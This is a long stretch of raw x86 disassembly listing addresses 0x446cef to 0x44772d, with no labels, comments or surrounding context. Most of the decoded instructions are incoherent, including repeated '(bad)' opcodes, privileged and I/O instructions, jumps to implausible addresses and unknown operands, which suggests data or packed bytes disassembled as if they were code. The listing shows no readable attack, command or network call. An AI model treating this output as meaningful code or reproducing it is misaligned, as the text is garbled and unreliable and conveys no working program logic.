  446cef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446cf0:	or     eax,DWORD PTR [edx]
  446cf2:	call   0xe82f4845
  446cf7:	enter  0xe8e6,0x11
  446cfb:	add    BYTE PTR [eax],al
  446cfd:	jmp    0x8102:0xcd5c80d7
  446d04:	ins    BYTE PTR es:[edi],dx
  446d05:	lds    esp,FWORD PTR [esi]
  446d07:	or     DWORD PTR [eax+eax*1+0x58],0xf047844d
  446d0f:	je     0x446d58
  446d11:	push   eax
  446d12:	lods   eax,DWORD PTR ds:[esi]
  446d13:	mov    BYTE PTR ds:0x8,bl
	...
  446d31:	add    BYTE PTR [eax],al
  446d33:	add    BYTE PTR [ebp+0x6c0c1d40],ch
  446d39:	add    al,0x0
  446d3b:	add    BYTE PTR [esi+esi*2],dh
  446d3e:	inc    edi
  446d3f:	push   esp
  446d40:	xlat   BYTE PTR ds:[ebx]
  446d41:	fadd   QWORD PTR [edi-0x77]
  446d44:	sub    cl,ch
  446d46:	mov    bh,0x1
  446d48:	hlt    
  446d49:	cld    
  446d4a:	dec    DWORD PTR [edx-0x1f337b4d]
  446d50:	lods   al,BYTE PTR ds:[esi]
  446d51:	jnp    0x446d97
  446d53:	and    al,0xe8
  446d55:	jne    0x446d96
  446d57:	sub    BYTE PTR [edi+0x42],bl
  446d5a:	sub    DWORD PTR [ebx+0x4480f89b],ecx
  446d60:	enter  0x80f8,0x4c
  446d64:	enter  0x80ec,0x54
  446d68:	fsub   st,st(4)
  446d6a:	sub    BYTE PTR [edi-0x34],0x75
  446d6e:	push   edi
  446d6f:	cmp    al,0x2f
  446d71:	cmp    DWORD PTR ds:0x1d412f2c,ebx
  446d77:	adc    al,0xef
  446d79:	shr    DWORD PTR [esi+0x22],0x37
  446d7d:	mov    ebp,0x6b722b02
  446d82:	or     al,0x0
  446d84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446d85:	cld    
  446d86:	and    al,cl
  446d88:	add    DWORD PTR [eax],ebp
  446d8a:	sbb    eax,0x839fc71c
  446d8f:	enter  0xbc77,0xea
  446d93:	stos   BYTE PTR es:[edi],al
  446d94:	shr    DWORD PTR [edi],1
  446d96:	sbb    eax,0x1c
	...
  446db3:	add    BYTE PTR [eax],al
  446db5:	add    ch,bl
  446db7:	das    
  446db8:	sbb    eax,0xf04b7f14
  446dbd:	(bad)  
  446dbe:	or     eax,0xdfffd56
  446dc3:	repz repz sub al,0x4d
  446dc7:	int3   
  446dc8:	stc    
  446dc9:	inc    ecx
  446dca:	xchg   esi,eax
  446dcb:	lea    edi,[edi-0x43]
  446dce:	add    eax,0x25056466
  446dd3:	jge    0x446e41
  446dd5:	test   DWORD PTR [ecx-0x1f82e806],ebp
  446ddb:	xchg   esi,eax
  446ddc:	cmp    eax,0x4550d3d
  446de1:	test   BYTE PTR [esp+edx*2+0x3282fffd],al
  446de8:	lods   eax,DWORD PTR ds:[esi]
  446de9:	dec    esp
  446dea:	pop    esp
  446deb:	imul   esi,DWORD PTR [ecx-0x7b],0x11
  446def:	cmc    
  446df0:	jl     0x446e26
  446df2:	sub    DWORD PTR [ecx-0x3],ebx
  446df5:	pop    ds
  446df6:	or     eax,0x1e56787c
  446dfb:	or     eax,edx
  446dfd:	inc    ebx
  446dfe:	push   ds
  446dff:	sbb    DWORD PTR [ebx],eax
  446e01:	sahf   
  446e02:	mov    edx,?
  446e04:	mov    edx,0xc9c43b62
  446e09:	aaa    
  446e0a:	mov    WORD PTR [eax],es
  446e0c:	loop   0x446e81
  446e0e:	xor    BYTE PTR [ebp-0x36],bh
  446e11:	das    
  446e12:	mov    WORD PTR [ebx-0x1a],ss
  446e15:	imul   esi,DWORD PTR [eax],0x27c910
	...
  446e37:	add    BYTE PTR [ebp+0x58],ah
  446e3a:	std    
  446e3b:	dec    DWORD PTR ds:0xa5bf9f5e
  446e41:	popa   
  446e42:	and    al,0x1a
  446e45:	ficom  DWORD PTR [edx+eax*1-0x8]
  446e49:	cs dec esp
  446e4b:	mov    esi,0x7d590d
  446e50:	clc    
  446e51:	pop    edx
  446e52:	push   0xec00520c
  446e57:	ret    
  446e58:	mov    ds:0xd01e6c3,al
  446e5d:	add    bh,ah
  446e5f:	push   0xc3e43f0b
  446e64:	mov    al,bl
  446e66:	out    0x0,al
  446e68:	or     eax,0xe3b9e700
  446e6d:	stos   BYTE PTR es:[edi],al
  446e6e:	push   cs
  446e6f:	imul   ecx,DWORD PTR [eax+esi*2-0x30eba799],0xde4d10f3
  446e7a:	mov    ecx,DWORD PTR [ecx-0xcd97fb0]
  446e80:	inc    ecx
  446e81:	pusha  
  446e82:	fisubr WORD PTR [ebx-0x70]
  446e85:	jmp    0x446e91
  446e87:	mov    DWORD PTR [ecx+0x1c],edx
  446e8a:	out    dx,eax
  446e8b:	and    dh,bl
  446e8d:	jp     0x446e7a
  446e8f:	jb     0x446e1c
  446e91:	xor    edi,ebp
  446e93:	aaa    
  446e94:	fcom   DWORD PTR [ebx+ebp*2+0x43]
  446e98:	pop    esi
  446e99:	jmp    0x44d9c5
	...
  446eba:	std    
  446ebb:	cdq    
  446ebc:	rcl    bh,1
  446ebe:	lock fnstcw WORD PTR cs:[ebp+0x6b]
  446ec3:	cld    
  446ec4:	out    0x3,al
  446ec6:	cli    
  446ec7:	retf   
  446ec8:	ret    0x3def
  446ecb:	cmp    al,0x0
  446ecd:	lods   al,BYTE PTR ds:[esi]
  446ece:	push   cs
  446ecf:	add    bh,ah
  446ed1:	mov    BYTE PTR [ebp-0x770b32c0],bh
  446ed7:	aaa    
  446ed8:	(bad)  
  446ed9:	hlt    
  446eda:	add    eax,0xd04db7c
  446edf:	add    BYTE PTR [edi+0x65],ah
  446ee2:	adc    al,0xcc
  446ee4:	or     ecx,DWORD PTR [esi]
  446ee6:	pop    edx
  446ee7:	rcl    bh,cl
  446ee9:	jge    0x446f5d
  446eeb:	adc    al,BYTE PTR [eax]
  446eed:	test   eax,0xa2869967
  446ef2:	xchg   ecx,eax
  446ef3:	test   BYTE PTR [eax],dl
  446ef5:	mov    edx,0x73e7fce9
  446efa:	int3   
  446efb:	xchg   edi,edi
  446efd:	call   0x8a116f10
  446f02:	mov    DWORD PTR [edi+edx*8],ebx
  446f05:	retf   0x34d5
  446f08:	jmp    0x446ef4
  446f0a:	(bad)  
  446f0b:	jle    0x446f61
  446f0d:	int    0x26
  446f0f:	(bad)  
  446f10:	hlt    
  446f11:	fiadd  WORD PTR [edi-0x7]
  446f14:	sub    al,0x29
  446f16:	aaa    
  446f17:	cdq    
  446f18:	xchg   BYTE PTR [edx],dh
  446f1a:	xchg   ecx,eax
  446f1b:	test   BYTE PTR [eax],dl
  446f1d:	cmp    al,BYTE PTR [eax]
	...
  446f3b:	add    BYTE PTR [ecx-0x3a9d1804],ch
  446f41:	and    DWORD PTR [edx+esi*2],eax
  446f44:	int    0x21
  446f46:	or     al,0xa
  446f48:	xor    al,0x7b
  446f4a:	add    al,0x58
  446f4c:	jb     0x446f7e
  446f4e:	mov    edi,0xcc7be143
  446f53:	shl    DWORD PTR [edx],cl
  446f55:	xor    ebp,ebx
  446f57:	jae    0x446f72
  446f59:	cwde   
  446f5a:	adc    dh,ah
  446f5c:	mov    dl,BYTE PTR [esi-0x7ff11700]
  446f62:	fcomip st,st(6)
  446f64:	(bad)  
  446f66:	xor    eax,0x85f6e220
  446f6b:	add    BYTE PTR [edx],bl
  446f6d:	inc    eax
  446f6e:	bound  edi,QWORD PTR [ebx+ebp*1]
  446f71:	cmp    eax,DWORD PTR [eax-0x1fcb6156]
  446f77:	bnd ss jle 0x446f46
  446f7b:	xchg   ecx,eax
  446f7c:	or     DWORD PTR [eax],eax
  446f7e:	add    cl,ch
  446f80:	inc    ebx
  446f81:	pusha  
  446f82:	dec    eax
  446f83:	add    BYTE PTR [esi],bl
  446f85:	adc    ebx,DWORD PTR [ebx]
  446f87:	lds    edx,FWORD PTR [edi+0x4fcffae0]
  446f8d:	add    DWORD PTR [ecx-0x7cdfef8c],eax
  446f93:	(bad)  
  446f94:	aas    
  446f95:	cmp    eax,0xbb6f281d
  446f9a:	push   es
  446f9b:	adc    al,0x0
	...
  446fbe:	scas   eax,DWORD PTR es:[edi]
  446fbf:	test   BYTE PTR ds:0x22a9bf18,bl
  446fc5:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446fc7:	mov    ds:0xc92289fa,eax
  446fcc:	dec    BYTE PTR [ecx+0x5681faf2]
  446fd2:	ss jle 0x446f93
  446fd5:	add    ebx,DWORD PTR [ecx+edi*1-0x4ac7806]
  446fdc:	jp     0x446fa5
  446fde:	imul   DWORD PTR [ebp+0x1cc08ba3]
  446fe4:	sub    al,0xe9
  446fe6:	aam    0xb1
  446fe8:	idiv   bh
  446fea:	addr16 mov bl,0xf8
  446fed:	je     0x447068
  446fef:	hlt    
  446ff0:	jnp    0x447016
  446ff2:	mov    esp,0x5f4fb02c
  446ff7:	test   DWORD PTR ds:0x7afa6e18,ebx
  446ffd:	jmp    0x18338b9
  447002:	cmp    al,0x3a
  447004:	sti    
  447005:	xchg   DWORD PTR [ebx-0x3],esi
  447008:	jp     0x446fd1
  44700a:	mov    al,ds:0xce9a1ad
  44700f:	scas   eax,DWORD PTR es:[edi]
  447010:	idiv   bh
  447012:	jl     0x44704f
  447014:	or     BYTE PTR [ebp-0x456],al
  44701a:	or     eax,0xdfffd6f
  44701f:	push   edi
  447020:	xor    al,0xe0
	...
  44703e:	add    BYTE PTR [eax],al
  447040:	aad    0xf9
  447042:	inc    eax
  447043:	std    
  447044:	dec    esp
  447045:	shl    DWORD PTR [edi+0x7e20523],1
  44704b:	jle    0x4470c1
  44704d:	ror    BYTE PTR [ebp-0x7],1
  447050:	bound  ebp,QWORD PTR [esi+0x789008c3]
  447056:	add    al,BYTE PTR [eax]
  447058:	or     eax,0xdfffcaf
  44705d:	push   edi
  44705e:	xor    al,0xe0
  447060:	aad    0x39
  447062:	inc    edx
  447063:	std    
  447064:	dec    esp
  447065:	shl    DWORD PTR [edi+0x7e20123],1
  44706b:	jle    0x4470a1
  44706d:	das    
  44706e:	push   eax
  44706f:	stc    
  447070:	and    dl,cl
  447072:	cmp    eax,DWORD PTR [ebp-0xee8052f]
  447078:	xor    al,0xe1
  44707a:	xlat   BYTE PTR ds:[ebx]
  44707b:	and    eax,DWORD PTR [ebp-0x12]
  44707e:	inc    ecx
  44707f:	or     DWORD PTR [edi+0xd00021b],ecx
  447085:	push   esi
  447086:	cmp    edi,DWORD PTR [ebp+0x71]
  447089:	cmc    
  44708a:	adc    eax,DWORD PTR [eax]
  44708c:	pusha  
  44708d:	std    
  44708e:	sbb    bh,BYTE PTR [edi+0x447ae90e]
  447094:	xor    DWORD PTR [ecx],eax
  447096:	or     edi,DWORD PTR [edi-0x40e386a5]
  44709c:	mov    esi,0xf6f17abd
  4470a1:	inc    esi
  4470a2:	pop    esp
  4470a3:	push   edx
	...
  4470c0:	add    BYTE PTR [eax],al
  4470c2:	not    BYTE PTR [edi]
  4470c4:	(bad)  
  4470c5:	dec    ebp
  4470c6:	out    0x17,al
  4470c8:	push   ebx
  4470c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4470ca:	xchg   esi,eax
  4470cb:	dec    edx
  4470cc:	sbb    al,0xee
  4470ce:	mov    dh,0x0
  4470d0:	das    
  4470d1:	jge    0x447124
  4470d3:	sbb    al,0x17
  4470d5:	or     eax,0x502cac5
  4470da:	add    DWORD PTR [ebx+edx*1],ebx
  4470dd:	add    eax,0x1cb8177d
  4470e2:	inc    ebp
  4470e3:	ja     0x447108
  4470e5:	sub    BYTE PTR ds:0x34d9a807,dl
  4470eb:	pop    ss
  4470ec:	test   al,0x54
  4470ee:	test   eax,0x15281b77
  4470f3:	ja     0x447120
  4470f5:	sub    BYTE PTR ds:0x24d9a807,bl
  4470fb:	pop    ss
  4470fc:	test   al,0x54
  4470fe:	imul   esi,DWORD PTR [edi+0x7a],0xd3572b1c
  447105:	add    al,0x3d
  447107:	pop    ss
  447108:	js     0x447186
  44710a:	rcr    DWORD PTR [ebx],1
  44710c:	iret   
  44710d:	or     al,0x62
  44710f:	retf   0x1cee
  447112:	pop    edx
  447113:	dec    edi
  447114:	cmp    DWORD PTR [esp+ebx*1+0x17],0x55
  447119:	jl     0x4470f0
  44711b:	dec    esi
  44711c:	cmp    DWORD PTR [ecx+edi*2+0x1c],0x13
  447121:	pop    ebx
  447122:	or     eax,DWORD PTR [edx+0x3a]
  447125:	push   eax
	...
  447142:	add    BYTE PTR [eax],al
  447144:	mov    BYTE PTR [edx-0x1e],al
  447147:	fcom   DWORD PTR ds:0xe87c23d2
  44714d:	repnz nop
  44714f:	daa    
  447150:	xor    ebx,esi
  447152:	cdq    
  447153:	fs add al,0xd2
  447156:	and    BYTE PTR [edi],0x11
  447159:	xrelease mov DWORD PTR [ebp+0x14],ebx
  44715d:	push   ebx
  44715e:	xor    BYTE PTR [ecx+ebx*2+0x1c],bh
  447162:	out    dx,eax
  447163:	pop    esp
  447164:	mov    dl,0x72
  447166:	add    dh,ah
  447168:	loope  0x4470ec
  44716a:	jge    0x447158
  44716c:	out    dx,eax
  44716d:	ror    BYTE PTR ds:0x94db8f6,1
  447173:	dec    edi
  447174:	add    eax,ebp
  447176:	shr    ebp,0x8b
  447179:	push   ebx
  44717a:	cli    
  44717b:	push   0xffffffd4
  44717d:	pop    ds
  44717e:	or     edx,edx
  447180:	sar    al,cl
  447182:	aam    0xc9
  447184:	jb     0x44714e
  447186:	(bad)  
  447188:	pop    ebx
  447189:	es test ebp,esp
  44718c:	(bad)  
  44718d:	clc    
  44718e:	mov    cl,0xb5
  447190:	pop    edx
  447191:	fadd   st,st(6)
  447193:	shl    BYTE PTR [ecx+0x381cc07b],cl
  447199:	sub    eax,0x7c0aa4f9
  44719f:	int    0x3e
  4471a1:	test   DWORD PTR [ecx+0xcdd],0xb0
	...
  4471c3:	add    BYTE PTR [eax],al
  4471c5:	add    BYTE PTR [edx+0x1e],al
  4471c8:	adc    al,0xf6
  4471ca:	xchg   esp,eax
  4471cb:	pop    edx
  4471cc:	por    mm1,QWORD PTR [esi]
  4471cf:	add    BYTE PTR [ebp+0x1059c839],al
  4471d5:	add    DWORD PTR [ecx],0x94983f9
  4471db:	add    BYTE PTR [eax],al
  4471dd:	push   0x71
  4471df:	div    DWORD PTR [ebx-0x2b]
  4471e2:	repz xor al,0xbf
  4471e5:	out    0xc8,al
  4471e7:	cmp    DWORD PTR [ecx],ecx
  4471e9:	scas   eax,DWORD PTR es:[edi]
  4471ea:	dec    ecx
  4471eb:	sbb    ebp,eax
  4471ed:	retf   0x7eda
  4471f0:	add    BYTE PTR [edi+0x37fe41cf],bh
  4471f6:	retf   0xbf34
  4471f9:	push   0x5c
  4471fb:	and    BYTE PTR [ecx+0x0],dh
  4471fe:	(bad)  
  4471ff:	inc    edx
  447200:	addr16 cmc 
  447202:	mov    ds:0xfa833723,eax
  447207:	test   DWORD PTR [esi],0xbd7eb2f3
  44720d:	and    BYTE PTR [ebx-0x2f74415a],ah
  447213:	pop    ss
  447214:	or     al,0xf
  447216:	mov    edi,0x4c7e06a5
  44721b:	inc    edx
  44721c:	js     0x4471f3
  44721e:	(bad)  
  44721f:	clc    
  447220:	jp     0x447231
  447222:	cli    
  447223:	add    BYTE PTR [ebx+0xfa6b5d8],al
  447229:	sub    eax,DWORD PTR [eax]
	...
  447247:	add    BYTE PTR [ebp+0x42],cl
  44724a:	addr16 leave 
  44724c:	mov    esp,0xc084084c
  447251:	cld    
  447252:	(bad)  
  447253:	push   DWORD PTR [edi-0x48bf924]
  447259:	inc    eax
  44725a:	int3   
  44725b:	rol    DWORD PTR [ebx+0x23],0xc1
  44725f:	rdmsr  
  447261:	mov    esp,0x4157e822
  447266:	jle    0x447268
  447268:	adc    bh,BYTE PTR ds:0xc3cd02f9
  44726e:	jae    0x447294
  447270:	add    ch,al
  447272:	mov    esi,0x2818b82b
  447277:	cmp    esi,DWORD PTR [edi]
  447279:	inc    edx
  44727a:	jnp    0x447225
  44727c:	in     al,0xfc
  44727e:	dec    DWORD PTR [edx+0x2beec63e]
  447284:	daa    
  447285:	jle    0x447268
  447287:	add    ebp,DWORD PTR [esi-0x5]
  44728a:	xchg   DWORD PTR [edi],eax
  44728c:	pop    esi
  44728d:	cmp    edi,edx
  44728f:	mov    DWORD PTR [edx+0xdc67afe],ebx
  447295:	push   esi
  447296:	jne    0x4472d9
  447298:	or     al,0xdf
  44729a:	mov    cl,0xfd
  44729c:	(bad)  
  44729d:	adc    esi,edi
  44729f:	in     al,dx
  4472a0:	imul   ecx,ebp,0xddf923d0
  4472a6:	test   al,0x23
  4472a8:	adc    eax,0xf92000
	...
  4472c9:	add    BYTE PTR [edx+0xd477959],bl
  4472cf:	(bad)  
  4472d0:	inc    esi
  4472d1:	inc    DWORD PTR [ecx]
  4472d3:	outs   dx,DWORD PTR ds:[esi]
  4472d4:	add    eax,0xd7ff297c
  4472d9:	lods   eax,DWORD PTR ds:[esi]
  4472da:	retf   0x35cd
  4472dd:	xchg   BYTE PTR [edx],cl
  4472df:	(bad)  
  4472e0:	push   esp
  4472e1:	std    
  4472e2:	xchg   edx,eax
  4472e3:	adc    ebp,edi
  4472e5:	xchg   edx,ecx
  4472e7:	push   esp
  4472e8:	jne    0x44732b
  4472ea:	push   cs
  4472eb:	(bad)  
  4472ec:	inc    edx
  4472ed:	add    al,0x5e
  4472ef:	lods   al,BYTE PTR ds:[esi]
  4472f0:	jbe    0x44734e
  4472f2:	icebp  
  4472f3:	pop    esi
  4472f4:	push   esi
  4472f5:	add    BYTE PTR [edx+0x71],al
  4472f8:	dec    ebx
  4472f9:	test   DWORD PTR [edx],edi
  4472fb:	scas   al,BYTE PTR es:[edi]
  4472fc:	ret    
  4472fd:	or     BYTE PTR [eax+0xd000460],cl
  447303:	(bad)  
  447304:	arpl   WORD PTR [ecx],cx
  447306:	adc    ah,BYTE PTR [esi+0x3d]
  447309:	or     DWORD PTR [ebx-0x77f3e0e9],ebx
  44730f:	push   esi
  447310:	stos   DWORD PTR es:[edi],eax
  447311:	cmp    al,0xd
  447313:	sub    dh,BYTE PTR [edi]
  447315:	test   DWORD PTR [ecx],ecx
  447317:	mov    ds:0xc6fbcc54,al
  44731c:	dec    edx
  44731d:	test   edx,esi
  44731f:	xchg   ecx,eax
  447320:	les    ecx,FWORD PTR [eax]
  447322:	nop
  447323:	xchg   DWORD PTR [eax+eax*1],eax
  447326:	or     eax,0xa0963aa
  44732b:	add    BYTE PTR [esi],dh
  44732d:	inc    ebx
	...
  44734a:	add    BYTE PTR [eax],al
  44734c:	add    al,0xbe
  44734e:	daa    
  44734f:	and    DWORD PTR [ecx],ebx
  447351:	test   edi,esp
  447353:	lods   eax,DWORD PTR ds:[esi]
  447354:	add    DWORD PTR [eax],eax
  447356:	pop    esi
  447357:	enter  0xbee,0xe6
  44735b:	cmp    BYTE PTR [eax+0x25b6f04],cl
  447361:	aas    
  447362:	repnz dec esp
  447364:	mov    BYTE PTR [edi],bh
  447366:	pop    esi
  447367:	cmp    al,0x90
  447369:	les    ecx,FWORD PTR [edx]
  44736b:	sbb    BYTE PTR [ecx+ebx*2-0x7d12892],bl
  447372:	or     eax,0x85821441
  447377:	add    ecx,DWORD PTR ds:0xf038e600
  44737d:	mov    ebx,0xb50d1402
  447382:	push   es
  447383:	sbb    DWORD PTR [edx+0x4a08b703],esp
  447389:	mov    dh,0x3e
  44738b:	sbb    DWORD PTR [edx+0x33],eax
  44738e:	inc    ebx
  44738f:	js     0x4473cd
  447391:	jmp    0x447328
  447393:	pop    eax
  447394:	xlat   BYTE PTR ds:[ebx]
  447395:	cli    
  447396:	mov    bh,0xd5
  447398:	shr    dl,1
  44739a:	xchg   edi,eax
  44739b:	push   eax
  44739c:	imul   ecx,DWORD PTR [ebx+0x2b381872],0xe3c97927
  4473a6:	mov    dh,0x8
  4473a8:	inc    ebp
  4473a9:	mov    dh,0xe
  4473ab:	add    DWORD PTR [ecx+0x112e3],ebx
	...
  4473cd:	add    ch,bh
  4473cf:	jmp    0xd537:0xfad51857
  4473d6:	xor    bl,ch
  4473d8:	pop    ss
  4473d9:	push   eax
  4473da:	test   eax,0x2527b38a
  4473df:	mov    eax,DWORD PTR [eax]
  4473e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4473e2:	sub    dh,al
  4473e4:	xor    al,0x18
  4473e6:	rcl    BYTE PTR [eiz*1-0x7a9bc2c8],0x16
  4473ee:	and    eax,0xdf9e52d
  4473f3:	xor    BYTE PTR ds:0x724f0518,ah
  4473f9:	icebp  
  4473fa:	adc    eax,0x2545ed4f
  4473ff:	xor    DWORD PTR ds:0xed461afa,esp
  447405:	inc    ebp
  447406:	adc    eax,0x121523b4
  44740b:	fsub   QWORD PTR [ebx]
  44740d:	icebp  
  44740e:	jmp    0xd71b6df6
  447413:	jbe    0x44740d
  447415:	sub    al,0x52
  447417:	ds mov bh,0xe3
  44741a:	push   cs
  44741b:	add    BYTE PTR [eax],al
  44741d:	rol    BYTE PTR ds:0x653d2068,cl
  447423:	jne    0x447425
  447425:	jmp    0xf2fa7438
  44742a:	push   cs
  44742b:	add    BYTE PTR [eax],al
  44742d:	xchg   edx,eax
  44742e:	xor    eax,0x34f475
	...
  44744f:	add    BYTE PTR [edx+0x3e],cl
  447452:	mov    bh,0xf3
  447454:	push   cs
  447455:	add    BYTE PTR [eax],al
  447457:	xchg   edx,eax
  447458:	cmp    DWORD PTR [ebx+0x7702c574],eax
  44745e:	cld    
  44745f:	adc    al,0x4a
  447461:	ds mov bh,0xd3
  447464:	push   cs
  447465:	add    BYTE PTR [eax],al
  447467:	push   edx
  447468:	or     DWORD PTR [ebp-0x7d46fabc],eax
  44746e:	(bad)  
  44746f:	fisttp QWORD PTR [ebx]
  447471:	test   DWORD PTR [eax-0xf],ecx
  447474:	jnp    0x447436
  447476:	sbb    eax,DWORD PTR [eax]
  447478:	jge    0x4474ae
  44747a:	in     al,0x0
  44747c:	ja     0x447485
  44747e:	inc    eax
  44747f:	shl    BYTE PTR [edi-0x198b05ff],0xbe
  447486:	aam    0x8b
  447488:	mov    al,ds:0xff8b581d
  44748d:	mov    esp,0xdaf51c4f
  447492:	cli    
  447493:	sub    dl,BYTE PTR ds:0xdf03d8c3
  447499:	in     al,dx
  44749a:	cmp    BYTE PTR [eax-0x48],0xbc
  44749e:	push   ecx
  44749f:	cmp    al,0x2f
  4474a1:	std    
  4474a2:	test   BYTE PTR [eax+edx*8+0x25],bl
  4474a6:	xor    bl,BYTE PTR [eax+eax*1+0x30]
  4474aa:	outs   dx,BYTE PTR ds:[esi]
  4474ab:	adc    al,0x1f
  4474ad:	aad    0x82
  4474af:	sbb    ch,ch
  4474b1:	fs sbb eax,0x14
	...
  4474cf:	add    BYTE PTR [eax],al
  4474d1:	add    BYTE PTR [edi-0x2a],ah
  4474d4:	sbb    BYTE PTR [eax+0x60],0x86
  4474d8:	jecxz  0x4474e5
  4474da:	jne    0x447541
  4474dc:	sbb    eax,0xb310ed14
  4474e1:	add    DWORD PTR [ecx+eax*1+0x0],esp
  4474e5:	rol    DWORD PTR [edi-0xbc28382],cl
  4474eb:	ret    
  4474ec:	cmp    al,BYTE PTR [eax]
  4474ee:	ss push eax
  4474f0:	add    DWORD PTR [edi],ecx
  4474f2:	ja     0x4474b8
  4474f4:	push   es
  4474f5:	jle    0x447558
  4474f7:	cmp    dh,BYTE PTR [eax+0x23]
  4474fa:	jg     0x4474b8
  4474fc:	popa   
  4474fd:	cmp    BYTE PTR [edi+0x5f141d64],ch
  447503:	out    0x6d,eax
  447505:	or     bh,bh
  447507:	jmp    0xbc443886
  44750c:	push   edi
  44750d:	add    al,0xd
  44750f:	ret    0x24fa
  447512:	(bad)  
  447513:	aad    0x26
  447515:	jge    0x4474e2
  447517:	xor    DWORD PTR [eax+esi*2+0x11],edi
  44751b:	mov    dl,0xa0
  44751d:	and    edi,ebp
  44751f:	xor    DWORD PTR [esi],esp
  447521:	jb     0x44752b
  447523:	add    ah,BYTE PTR ds:0x427ce7f
  447529:	add    BYTE PTR ds:0xb60fa4b0,cl
  44752f:	and    ebx,DWORD PTR [edx]
  447531:	cmc    
  447532:	ret    0x83ed
  447535:	rol    DWORD PTR [eax],0x0
	...
  447554:	or     al,0x28
  447556:	std    
  447557:	call   DWORD PTR [esi+edi*2+0x66c97ced]
  44755e:	push   0xa68d3855
  447563:	mov    esp,0xcc3872c1
  447568:	pop    ecx
  447569:	push   0x38
  44756b:	int3   
  44756c:	push   ecx
  44756d:	sti    
  44756e:	jp     0x44755c
  447570:	mov    ?,WORD PTR [edx-0x38]
  447573:	test   al,bl
  447575:	push   esi
  447576:	adc    al,0xc0
  447578:	sbb    dh,BYTE PTR [esi+0x674c853b]
  44757e:	pop    ebp
  44757f:	adc    BYTE PTR [esi],al
  447581:	push   0xcac886ae
  447586:	je     0x4475cb
  447588:	jne    0x447539
  44758a:	mov    eax,0x93eb94ab
  44758f:	xchg   eax,edx
  447591:	shl    BYTE PTR [ebx+eax*2+0x75],cl
  447595:	scas   eax,DWORD PTR es:[edi]
  447596:	mov    eax,0x43e394bb
  44759b:	sub    eax,0x7b7b1d4d
  4475a0:	or     DWORD PTR [ecx+esi*1+0x4dfff774],esp
  4475a7:	add    dl,BYTE PTR [esi+0xd03e797]
  4475ad:	add    dl,ah
  4475af:	nop
  4475b0:	or     ebx,eax
  4475b2:	ror    BYTE PTR [eax+0x49],0xcd
  4475b6:	mov    dh,BYTE PTR [edi+0x0]
	...
  4475d5:	add    BYTE PTR [ecx-0x33],bl
  4475d8:	add    ah,0x19
  4475db:	ds mov ch,0x59
  4475de:	nop
  4475df:	mov    ch,0xce
  4475e1:	jl     0x4475ea
  4475e3:	mov    DWORD PTR [edi+eax*2+0x3e70b85],esi
  4475ea:	or     eax,0x39848990
  4475ef:	lds    eax,FWORD PTR [edx+0x4]
  4475f2:	add    ch,BYTE PTR ds:[edi+0x7601a584]
  4475f9:	push   ebp
  4475fa:	mov    al,ch
  4475fc:	add    cl,BYTE PTR ds:0x7ae3b2c5
  447602:	dec    esi
  447603:	cmp    al,0x6e
  447605:	cmp    ecx,DWORD PTR [esi-0x77e4abc0]
  44760b:	(bad)  
  44760e:	sbb    eax,0x32f42443
  447613:	add    edi,esp
  447615:	add    edx,DWORD PTR [eax+0xb7ad6cd]
  44761b:	jg     0x447604
  44761d:	call   DWORD PTR [ecx-0x2e029ff0]
  447623:	(bad)  
  447624:	jmp    0xd03:0xe8024da8
  44762b:	add    dh,dl
  44762d:	inc    ebx
  44762e:	xlat   BYTE PTR ds:[ebx]
  44762f:	xchg   BYTE PTR [esi+eiz*4+0x23dcf71],al
  447636:	or     eax,0xce700
	...
  447657:	add    BYTE PTR [eax-0x4e],ah
  44765a:	jmp    ebx
  44765c:	sub    al,0xbc
  44765e:	jnp    0x44766c
  447660:	ins    DWORD PTR es:[edi],dx
  447661:	add    BYTE PTR [ebx-0x14],dh
  447664:	shl    ebx,1
  447666:	xlat   BYTE PTR ds:[ebx]
  447667:	fistp  DWORD PTR [ecx-0xb]
  44766a:	(bad)  
  44766b:	ficom  DWORD PTR [ecx]
  44766d:	sbb    DWORD PTR [ebx+0x4d],0xffffff80
  447671:	cmp    bh,cl
  447673:	jmp    0x6d0afb86
  447678:	ret    0xffde
  44767b:	in     eax,0x7d
  44767d:	mov    bl,0x4a
  44767f:	test   DWORD PTR [ecx],ecx
  447681:	dec    edx
  447682:	and    eax,0x3f10d63f
  447687:	push   0x57
  447689:	or     DWORD PTR [edx+0x6],esi
  44768c:	cmp    DWORD PTR [edi-0x4a079bf9],ebp
  447692:	or     al,0x6c
  447694:	cmp    al,0xb4
  447696:	add    ch,BYTE PTR [edx+0x56]
  447699:	cmp    ebp,DWORD PTR [ebp-0x1d]
  44769c:	imul   edx,edi,0xd645217c
  4476a2:	test   ah,cl
  4476a4:	mov    ah,0x7b
  4476a6:	sub    eax,0x438163a9
  4476ab:	outs   dx,DWORD PTR ds:[esi]
  4476ac:	mov    DWORD PTR [ecx],edi
  4476ae:	stc    
  4476af:	jmp    0x744c9bc2
  4476b4:	lods   eax,DWORD PTR ds:[esi]
  4476b5:	jecxz  0x4476b6
  4476b7:	call   0x4fd476ca
	...
  4476d8:	add    BYTE PTR [eax],al
  4476da:	(bad)  
  4476db:	retf   
  4476dc:	add    ah,BYTE PTR [ebp+0x33]
  4476df:	cmp    eax,DWORD PTR [ebp-0x14]
  4476e2:	stos   BYTE PTR es:[edi],al
  4476e3:	mov    esp,0x8160ebbf
  4476e8:	dec    esp
  4476e9:	in     al,dx
  4476ea:	mov    edx,0x5ceff7bc
  4476ef:	and    DWORD PTR [ebp+0x2c340900],eax
  4476f5:	shr    BYTE PTR [ecx+0xa2c73ed],0x7f
  4476fc:	cmp    al,0x47
  4476fe:	and    al,0x4a
  447700:	sbb    DWORD PTR [edi],ecx
  447702:	stos   DWORD PTR es:[edi],eax
  447703:	cmp    BYTE PTR [eax+0xf],al
  447706:	fwait
  447707:	js     0x44774f
  447709:	test   BYTE PTR [edi+0x4f],ch
  44770c:	adc    eax,0x46006d66
  447711:	packssdw mm7,QWORD PTR [eax]
  447714:	inc    eax
  447715:	and    ax,WORD PTR [eax+0x46]
  447719:	test   BYTE PTR [edi+0x4f],ch
  44771c:	add    DWORD PTR [ebp+0x407d7870],ecx
  447722:	scas   eax,DWORD PTR es:[edi]
  447723:	mov    edi,0xfa3fd469
  447728:	jp     0x447712
  44772a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44772b:	mov    edi,?
  44772d:	inc    DWORD PTR [ebx]
